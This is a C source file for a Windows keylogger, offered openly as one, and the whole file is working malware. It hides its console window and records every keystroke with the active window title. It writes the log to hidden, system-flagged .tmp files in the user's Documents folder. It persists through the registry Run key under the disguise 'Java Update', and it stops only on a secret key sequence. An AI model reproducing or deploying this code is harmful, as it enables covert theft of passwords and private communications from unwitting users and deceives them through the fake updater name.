/*
===========================================================
BASIC KEYLOGGER for windows platforms using
GetAsyncKeyState
@author: Velorek
@version: 0.1
@last modified: MAY 2021
===========================================================
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include <direct.h>
//CONSTANTS
#define FILENAME "cap"
#define FILEEXTENSION ".tmp"
#define EXITKEY "\e1234\0"
#define CLEANSTR "\0"
#define K_BACKSPACE 8
#define K_ENTER 13
#define K_BSPSTR "{BKSPC}"
#define K_ENTERSTR "{ENTER}"
#define IDD_COMBO 2032
#define PATHSTART "C:\\USERS"
#define DOCUMENTS "DOCUMENTS"
#define TRUE 1
#define FALSE 0
typedef int BOOL;

//HELP MESSAGES

char oldWindowTitle[256];

/* FUNCTION DECLARATIONS */

long    fileSize(FILE * fileHandler);
int     openFile(FILE ** fileHandler, char *fileName, char *mode);
int     closeFile(FILE * fileHandler);
long    writeToFile(FILE * fileHandler,char ch);
void    writeWindowTitle(FILE * fileHandler);
int     file_exists(FILE **fileHandler, char *fileStr);
int     kbhit(char *ch);
void    RegisterProgram();
BOOL    IsMyProgramRegisteredForStartup(PCWSTR pszAppName);
BOOL    RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);

int kbhit(char *ch){
int i=0, keystate=0;
int exitFlag=0, ok=0;
char oldch=0;


  oldch = *ch;
  //Run through all key scancodes from 0 to 255
  do{
    keystate = GetAsyncKeyState(i);
    if (keystate == -32768) {
            //A key has been pressed
            exitFlag = 1;
            ok=1;
    }
    if (i==255) {
            //Exit if we got to the end
            exitFlag = 1;
            ok=0;
    }
    if (keystate == 0) i++;
  } while(exitFlag != 1);
  //return key pressed
  *ch = i;
  if (*ch == oldch) {
   //Reset if we have the same value as before.
        ok = 0;
  }
  return ok;
}

int main() {
  FILE *fileHandler;
  char charcombination[6];
  char daystr[2];
  char monstr[2];
  char fileStr[512];
  char userName[180];
  char tmpPath[512];
  DWORD username_len = 181;
  int exitFlag =0;
  int i=0;
  int month;
  char ch=0;
  time_t now = 0;
  struct tm *ltm;

   //Get time & date
   now = time(0);
   ltm = localtime(&now);
  //hide console window
  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
  //register at startup
  RegisterProgram();
  //SAFEPATH -> C:\USERS\$USERNAME$\DOCUMENTS\CAP$DAY$_$MONTH$.TMP
  month = ltm->tm_mon;
  month++;
  sprintf(daystr, "%d", ltm->tm_mday);
  sprintf(monstr, "%d", month);
  strcpy(fileStr,PATHSTART);
  strcat(fileStr,"\\");
  GetUserName(userName, &username_len);
  strcat(fileStr,userName);
  strcat(fileStr,"\\");
  strcat(fileStr,DOCUMENTS);
  strcat(fileStr,"\\");
  strcpy(tmpPath,fileStr); //to use with attrib
  strcat(fileStr, FILENAME);
  strcat(fileStr, daystr);
  strcat(fileStr, "_");
  strcat(fileStr, monstr);
  strcat(fileStr, FILEEXTENSION);
  //printf("%s\n",fileStr);
  if (file_exists(&fileHandler, fileStr) == 1)
     openFile(&fileHandler,fileStr,"a");
  else
    openFile(&fileHandler,fileStr, "w");
  _chdir(tmpPath); //go to where tmp files are
  system("attrib +h +s *.tmp");
  fprintf(fileHandler, "\n%s\n", asctime(ltm));

  do{
     if (kbhit(&ch) == 1) {

            //To exit program -> ESC + 1234
            writeWindowTitle(fileHandler);
            if (i==0) strcpy(charcombination, CLEANSTR);
            if (ch==27 || i>0) {
                charcombination[i] = ch;
                i++;
                if (i==5) {
                        charcombination[5] ='\0';
                        i=0;
                }
            }
            if (ch>31 && ch<128) writeToFile(fileHandler,ch);
            if (ch == K_ENTER) fprintf(fileHandler, "%s\n",K_ENTERSTR); //Enter
            if (ch==K_BACKSPACE) fprintf(fileHandler, "%s",K_BSPSTR); //Backspace
     }
     if (strcmp(charcombination,EXITKEY)==0){
        exitFlag = 1;
     }
  } while (exitFlag != 1);
  return 0;
}


int closeFile(FILE * fileHandler) {
  int     ok;
  ok = fclose(fileHandler);
  return ok;
}

int openFile(FILE ** fileHandler, char *fileName, char *mode) {
  int     ok;
  *fileHandler = fopen(fileName, mode);
  //check whether buffer is assigned
  //and return value
  if(*fileHandler != NULL)
    ok = 1;
  else
    ok = 0;
  return ok;
}

long writeToFile(FILE * fileHandler, char ch) {
  long    byteCount = 0;

  //Read char by char
  if(fileHandler != NULL) {
     //fseek(fileHandler, 0, SEEK_END);
     fprintf(fileHandler, "%c",ch);
     fflush(fileHandler); //to avoid pre-buffering
  }
  return byteCount;
}

int file_exists(FILE **fileHandler, char *fileStr){
    int ok = 0;

*fileHandler = fopen(fileStr, "r");
if (*fileHandler != NULL){
   ok = 1;
   fclose(*fileHandler);
}else{
    ok=0;
   //file doesn't exists or cannot be opened
}
return ok;
}

void writeWindowTitle(FILE * fileHandler)
{
  HWND hwndDlg;
  char newWindowTitle[256];
  hwndDlg = GetForegroundWindow();
  GetWindowText(hwndDlg, newWindowTitle, 256);
  if (strcmp(oldWindowTitle,newWindowTitle) != 0) {fprintf(fileHandler,"\n[%s]\n",newWindowTitle);}
  oldWindowTitle[0] = '\0';
  strcat(oldWindowTitle,newWindowTitle);
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH*2;
    wchar_t szValue[count];


    wcscpy_s(szValue, count, L"\"");
    wcscat_s(szValue, count, pathToExe);
    wcscat_s(szValue, count, L"\" ");

    if (args != NULL)
    {
        // caller should make sure "args" is quoted if any single argument has a space
        // e.g. (L"-name \"Mark Voidale\"");
        wcscat_s(szValue, count, args);
    }

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (wcslen(szValue)+1)*2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

void RegisterProgram()
{
    wchar_t szPathToExe[MAX_PATH];

    GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
    RegisterMyProgramForStartup(L"Java Update", szPathToExe, L"");
}


